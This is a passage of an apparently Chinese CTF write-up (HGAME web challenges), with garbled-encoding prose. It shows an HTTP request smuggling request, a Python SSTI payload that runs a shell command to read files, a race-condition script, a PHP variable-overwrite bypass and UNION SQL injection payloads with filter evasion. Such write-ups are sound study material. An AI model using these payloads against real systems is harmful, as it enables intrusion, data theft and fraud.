src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397285458911/c03887b367f01410d362af29a3cadc215e0ee195.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gameOverShowText: <span class="function"><span class="keyword">function</span> (<span class="params">e, t</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(e &gt; <span class="number">1999</span>)&#123;</span><br><span class="line">alert(<span class="built_in">window</span>.atob(<span class="string">&quot;aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// this.ajaxLoad(&quot;http://www.wesane.com/admin.php/Gamescore/saveGamescore&quot;, &quot;gameScore=&quot; + e + &quot;&amp;gameId=&quot; + this.gameHttpId + &quot;&amp;gameType=&quot; + t, this.scoreResult)</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;do_you_know_cocos_game?&#125;</span><br></pre></td></tr></table></figure><h3 id="å®è—èµ°ç§è€…"><a href="#å®è—èµ°ç§è€…" class="headerlink" title="å®è—èµ°ç§è€…"></a>å®è—èµ°ç§è€…</h3><blockquote><p>å‚è€ƒï¼š<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></p></blockquote><p>F12 çœ‹è¯·æ±‚å¯ä»¥å‘ç° <code>Server: ATS/7.1.2</code>ï¼ŒåŒæ—¶åœ¨ <code>.../secret</code> é¡µé¢æœ‰å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ONLY LOCALHOST(127.0.0.1) CAN ACCESS THE SECRET_DATA!</span><br><span class="line">YOUR Client-IP(Client-IP NOT FOUND IN HEADERS!) IS NOT ALLOWED!</span><br></pre></td></tr></table></figure><p>äºæ˜¯å°è¯•æ„é€ è¯·æ±‚èµ°ç§ï¼Œä½¿å¾—æœåŠ¡å™¨æ¥æ”¶åˆ°ä¸€ä¸ªåŒ…å« Client-IP çš„ GET è¯·æ±‚ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;secret HTTP&#x2F;1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length : 445</span><br><span class="line"></span><br><span class="line">GET &#x2F;secret HTTP&#x2F;1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>å…³é”®åœ¨äºè®¡ç®—å¥½ Content-Length çš„é•¿åº¦å¹¶åœ¨å‰åæ·»åŠ ç©ºæ ¼ï¼Œä½¿å¾— ATS å¯ä»¥æ­£å¸¸è½¬å‘è€Œåç«¯æœåŠ¡å™¨å°†å…¶å¿½ç•¥åè¯†åˆ«ä¸ºä¸¤ä¸ªè¯·æ±‚ã€‚ä½¿ç”¨ BurpSuite å‘é€ä¸¤æ¬¡æ„é€ å¥½çš„è¯·æ±‚å°±å¯ä»¥å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397286171995/aa9a72abfc6e87cd3217ff16f50aeff92f6eed16.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;HtTp+sMUg9l1nG^i5~r3al1y-d4nG3r0Us!&#125;</span><br></pre></td></tr></table></figure><h3 id="æ™ºå•†æ£€æµ‹é¸¡"><a href="#æ™ºå•†æ£€æµ‹é¸¡" class="headerlink" title="æ™ºå•†æ£€æµ‹é¸¡"></a>æ™ºå•†æ£€æµ‹é¸¡</h3><p>å®šç§¯åˆ†è®¡ç®—ï¼Œä¸»è¦æœ‰ä¸‰ä¸ªè·¯ç”±ï¼Œ<code>.../api/verify</code> è´Ÿè´£æ£€éªŒç­”æ¡ˆï¼Œ<code>.../api/getQuestion</code> è´Ÿè´£æä¾›é¢˜ç›®ï¼Œ<code>.../api/api/getStatus</code> è´Ÿè´£æŸ¥è¯¢è§£å‡ºæ•°ã€‚åªéœ€è¦å†™ä¸ªè„šæœ¬ç®—å‡ºç»“æœæäº¤ï¼Œæœ€åå†ç»™å‡º session çš„ cookie å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://r4u.top:5000/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        questionRaw = session.get(url + <span class="string">&quot;api/getQuestion&quot;</span>).content</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Parsing &#123;&#125;&quot;</span>.<span class="built_in">format</span>(questionRaw))</span><br><span class="line">        regex = <span class="string">r&quot;([-+]&#123;1&#125;)&lt;/mo&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&lt;/mn&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&quot;</span></span><br><span class="line">        matches = re.findall(regex, questionRaw.decode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line">        lowerLimit, upperLimit = (<span class="built_in">int</span>(matches[<span class="number">0</span>][<span class="number">0</span>] + matches[<span class="number">0</span>][<span class="number">1</span>]), <span class="built_in">int</span>(matches[<span class="number">0</span>][<span class="number">2</span>]))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Matching &#123;&#125; from &#123;&#125; to &#123;&#125;&quot;</span>.<span class="built_in">format</span>(matches, lowerLimit, upperLimit))</span><br><span class="line"></span><br><span class="line">        regex = <span class="string">r&quot;&lt;mn&gt;(\d&#123;1,9&#125;)&lt;/mn&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;([+-]&#123;1&#125;)&lt;/mo&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&quot;</span></span><br><span class="line">        matches = re.findall(regex, questionRaw.decode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line">        arg1, operator, arg2 = matches[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Calculate &#123;&#125; with &#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(matches, arg1, operator, arg2))</span><br><span class="line">        x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        result = <span class="string">&quot;%.2f&quot;</span> % (integrate(<span class="built_in">int</span>(arg1) * x + <span class="built_in">int</span>(arg2), (x, lowerLimit, upperLimit)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Calculated result is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line"></span><br><span class="line">        response = session.post(url + <span class="string">&quot;api/verify&quot;</span>, data=json.dumps(&#123;<span class="string">&quot;answer&quot;</span>: result&#125;), headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Verify status is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(response.content))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;true&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Verify correct with &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Raw data is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(response.content))</span><br><span class="line">        response.close()</span><br><span class="line">        status = session.get(url + <span class="string">&quot;api/getStatus&quot;</span>).content</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Status is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(status))</span><br><span class="line">        index = session.get(url).content</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Index is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Done All for you and cookie is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(session.cookies))</span><br></pre></td></tr></table></figure><p>æœ€åçœ‹åˆ°è¾“å‡ºç»“æœä¹‹åï¼Œå°†æ–°çš„ cookie é‡æ–°åº”ç”¨äºé¡µé¢ï¼Œåˆ·æ–°åå³å¯çœ‹åˆ° flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] Done All for you and cookie is &lt;RequestsCookieJar[&lt;Cookie session&#x3D;eyJzb2x2aW5nIjoxMDB9.YBZaeA.1FXCgOvOT6RDRijlX1RhlG6arlI for r4u.top&#x2F;&gt;]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397286433864/cafdb6939be55e367ed66b6c72327e681b582724.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3very0ne_H4tes_Math&#125;</span><br></pre></td></tr></table></figure><h3 id="èµ°ç§è€…çš„æ„¤æ€’"><a href="#èµ°ç§è€…çš„æ„¤æ€’" class="headerlink" title="èµ°ç§è€…çš„æ„¤æ€’"></a>èµ°ç§è€…çš„æ„¤æ€’</h3><blockquote><p>Content-Length çš„è®¡ç®—æ–¹æ³•ï¼š</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397286716761/7f2114e78469e470a2b380ea6d67bb020250a9a6.png"></p></blockquote><!-- ![](https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397287283996/af1cb16d36e4861fdfc5fe939ae8a4a57ebd0d72.png) --><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Fe3l^tHe~4N9eR+oF_5mu9gl3r!!&#125;</span><br></pre></td></tr></table></figure><h3 id="Likiçš„ç”Ÿæ—¥ç¤¼ç‰©"><a href="#Likiçš„ç”Ÿæ—¥ç¤¼ç‰©" class="headerlink" title="Likiçš„ç”Ÿæ—¥ç¤¼ç‰©"></a>Likiçš„ç”Ÿæ—¥ç¤¼ç‰©</h3><p>è¿›å…¥é¶æœºä¹‹åå‘ç°æ˜¯ä¸€ä¸ªå…‘æ¢ç³»ç»Ÿï¼Œæœ‰ä¸€ä¸ªç”¨äºå…‘æ¢çš„ APIã€‚å¾ˆå®¹æ˜“çŒœæƒ³åˆ°ä½¿ç”¨å¤šçº¿ç¨‹è¯·æ±‚å»å¤šå…‘æ¢ã€‚äºæ˜¯å†™ä¸€ä¸ªè„šæœ¬å®ç°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;https://birthday.liki.link/API/&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RushThread</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Thread Rushed&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = &#123;</span><br><span class="line">            <span class="string">&quot;m&quot;</span>: <span class="string">&#x27;buy&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;amount&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = session.post(url=ENV, params=param, data=data)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="built_in">print</span>(session.cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param = &#123;</span><br><span class="line">    <span class="string">&quot;m&quot;</span>: <span class="string">&#x27;login&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="number">122</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="number">12</span></span><br><span class="line">&#125;</span><br><span class="line">response = session.post(ENV, params=param, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line">event = threading.Event()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    threading.Thread(target=RushThread, args=()).start()</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸‰åä¸ªçº¿ç¨‹å»ç«äº‰ï¼Œæœ€åå¯ä»¥å…‘æ¢å¾—åˆ°è¶…é¢çš„å…‘æ¢åˆ¸ï¼Œä»è€Œå…‘æ¢åˆ° switchã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397287601915/5200e81022cc326b294603ce261ce7fc07565205.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;L0ck_1s_TH3_S0lllut!on!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h3><p>ç™»å½•åå¯ä»¥æ·»åŠ  Noteï¼Œè¯•æ¢ä¸€ä¸‹å¯ä»¥å‘ç° SSTI æ³¨å…¥ç‚¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613403884018/0cd3efd6b4d820df67eb99a4409453493d125142.png"></p><p>ç¨å¾®å°è¯•åå¯ä»¥æ„é€ å‡ºå¦‚ä¸‹ payloadã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).popen(&#39;od$IFS$9-c$IFS$9&#x2F;f*&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613403938612/0f0f5f5abe79131881163ae843866819ad85e8ee.png"></p><p>æ•´ç†åå¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;h0w_4bou7+L3arn!ng~PythOn^Now?&#125;</span><br></pre></td></tr></table></figure><h3 id="LazyDogR4U"><a href="#LazyDogR4U" class="headerlink" title="LazyDogR4U"></a>LazyDogR4U</h3><p>è®¿é—® <a href="http://www.zip/">www.zip</a> å¯ä»¥æ³„éœ²å‡ºä¸€éƒ¨åˆ†æºç ï¼Œä¸‹è½½ä¸‹æ¥å…ˆå¤§è‡´å®¡è®¡ä¸€éã€‚User ä¸­å­˜åœ¨ä»¥ä¸‹å¼±æ¯”è¾ƒï¼Œå¯èƒ½ç›´æ¥ç™»å½•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$password</span>) == <span class="variable">$userList</span>[<span class="variable">$username</span>][<span class="string">&#x27;pass_md5&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>lazy.php ä¸­å­˜åœ¨å¦‚ä¸‹å˜é‡æ³¨å†Œï¼Œå¯èƒ½ä¼šå­˜åœ¨å˜é‡è¦†ç›–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = [<span class="string">&quot;SESSION&quot;</span>, <span class="string">&quot;SEVER&quot;</span>, <span class="string">&quot;COOKIE&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›´æ¥æ³¨å†Œæ‰€æœ‰å˜é‡ï¼Œè¿™æ ·æˆ‘å°±èƒ½å°‘æ‰“å­—åŠ›ï¼ŒèŠœæ¹–~</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filter</span> <span class="keyword">as</span> <span class="variable">$youBadBad</span>)&#123;</span><br><span class="line">            <span class="variable">$_k</span> = str_replace(<span class="variable">$youBadBad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_k</span>); <span class="comment">//# ä»…åšäº†ä¸€æ¬¡æ›¿æ¢ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥åŒå†™ç»•è¿‡</span></span><br><span class="line">        &#125;</span><br><span class="line">        $&#123;<span class="variable">$_k</span>&#125; = <span class="variable">$_v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag.php ä¸­å­˜åœ¨å¯¹ SESSION ä¸­å€¼çš„ç›´æ¥åˆ¤æ–­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;adminå°†äºä»Šæ—¥è·å–è‡ªå·±å¿ å®çš„flag&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;<span class="subst">$flag</span>&lt;/h3&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$submit</span> == <span class="string">&quot;getflag&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;<span class="subst">&#123;$_SESSION[&#x27;username&#x27;]&#125;</span>æ¥è¿‘äº†é—®é¢˜çš„ç»ˆç‚¹&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;ç¯¡ä½è€…å é¢†äº†ç¥åœ£çš„é¡µé¢&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¯ä»¥å°è¯•ä½¿ç”¨å˜é‡è¦†ç›–è¾¾æˆå¯¹ SESSION ä¸­å€¼çš„è¦†ç›–ã€‚å› æ­¤æ„é€ å‡ºå¦‚ä¸‹ payloadã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f2035f880d.lazy.r4u.top/flag.php?_SESSIOSESSIONN[username]=admin</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ SESSION ä¸­çš„ username è¢«è¦†ç›–æˆä¸º adminï¼Œä»è€ŒæˆåŠŸå¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614927165219/2df95ad8448dd57aecc64076f8aa72938baefd1e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;R4U-!s_A~l@zy_D0G&#125;</span><br></pre></td></tr></table></figure><h3 id="200OK"><a href="#200OK" class="headerlink" title="200OK!!"></a>200OK!!</h3><p>ç‚¹å‡»æŒ‰é’®å¯ä»¥å‘ç°å¦‚ä¸‹çº¿ç´¢ï¼Œserver.php çš„è¯·æ±‚å¤´ä¸­åŒ…å«äº†å¥‡æ€ªçš„å‚æ•°ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614927402598/abe03a338b6dd2d432359de263bfa09222c24c9c.png"></p><p>å°è¯•åå¯ä»¥å‘ç° status å¤„å­˜åœ¨ SQL æ³¨å…¥ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-2&#39;&#x2F;**&#x2F;or(2&#x3D;1)# ---&gt; æ— å›æ˜¾</span><br><span class="line">-2&#39;&#x2F;**&#x2F;or(1)# ---&gt; HTTP 200 OK</span><br></pre></td></tr></table></figure><p>äºæ˜¯ä¸€æŠŠæ¢­å…ˆæ„é€ ä¸€ä¸ªè”åˆæ³¨å…¥ <code>-2&#39;/**/uNion/**/seLect/**/1#</code> å¾—åˆ° <code>1</code> çš„å›æ˜¾ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-2</span><span class="string">&#x27;/**/uNion/**/seLect/**/groUp_concat(schema_name)/**/frOm/**/infOrmation_schEma.schEmata# </span></span><br><span class="line"><span class="string">çˆ†å‡ºæ•°æ®åº“ information_schema,mysql,performance_schema,sys,week2sqli</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-2&#x27;</span><span class="comment">/**/</span><span class="keyword">uNion</span><span class="comment">/**/</span><span class="keyword">seLect</span><span class="comment">/**/</span>group_concat(tablE_nAme)<span class="comment">/**/</span><span class="keyword">frOm</span><span class="comment">/**/</span>infOrmation_schEma.tablEs<span class="comment">/**/</span><span class="keyword">whEre</span><span class="comment">/**/</span>table_schema<span class="operator">=</span>databAse()# </span><br><span class="line">çˆ†å‡ºè¡¨ f1111111144444444444g,status</span><br><span class="line"></span><br><span class="line"><span class="number">-2</span><span class="string">&#x27;/**/uNion/**/seLect/**/group_concat(cOlumn_nAme)/**/frOm/**/infOrmation_schEma.colUmns/**/whEre/**/table_schema=databAse()# </span></span><br><span class="line"><span class="string">çˆ†å‡ºè¡¨ä¸­çš„å­—æ®µ ffffff14gggggg,id,status</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-2&#x27;</span><span class="comment">/**/</span><span class="keyword">uNion</span><span class="comment">/**/</span><span class="keyword">seLect</span><span class="comment">/**/</span>group_concat(ffffff14gggggg)<span class="comment">/**/</span><span class="keyword">frOm</span><span class="comment">/**/</span>f1111111144444444444g# </span><br><span class="line">æŸ¥å‡º flag</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!&#x3D;)&#125;</span><br></pre></td></tr></table></figure><p>é¡ºæ‰‹æŸ¥å‡ºäº† statusã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP 200 OK,NETWORK ERROR,HTTP 400 Bad Request,HTTP 401 Unauthorized,HTTP 403 Forbidden,HTTP 404 Not Found,HTTP 405 Method Not Allowed,HTTP 406 Not Acceptable,HTTP 408 Request Timeout,HTTP 414 URI Too Long,HTTP 418 I&#39;m a teapot,HTTP 500 Internal Server Error,HTTP 502 Bad Gateway,HTTP 503 Service Unavailable,HTTP 504 Gateway Timeout,UNKNOWN 